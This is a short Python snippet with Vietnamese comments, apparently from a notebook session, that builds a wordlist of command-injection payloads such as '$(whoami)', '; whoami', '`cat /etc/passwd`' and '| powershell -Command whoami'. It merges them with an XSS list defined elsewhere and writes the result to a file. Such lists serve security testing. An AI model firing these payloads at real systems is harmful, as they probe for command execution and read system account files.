# Tạo thêm danh sách các payload RCE (Remote Code Execution) giả lập, lưu cùng file

rce_payloads = [
    "`whoami`",
    "$(whoami)",
    "${@print(md5)}",
    "|| whoami",
    "& whoami",
    "; whoami",
    "`cat /etc/passwd`",
    "$(ls -la)",
    "|| dir",
    "& net user",
    "| powershell -Command whoami",
    "'; ls; #",
    "' && ls && '",
]

# Giới hạn số lượng RCE payload sinh tự động
max_rce = 1000

rce_list = []
for i in range(max_rce):
    for template in rce_payloads:
        rce_list.append(f"{template}_{i}")

# Gộp danh sách XSS và RCE
full_payload_list = payload_list + rce_list

# Ghi vào file
full_file_path = "/mnt/data/xss_rce_payloads.txt"
with open(full_file_path, "w", encoding="utf-8") as f:
    f.write("\n".join(full_payload_list))

full_file_path
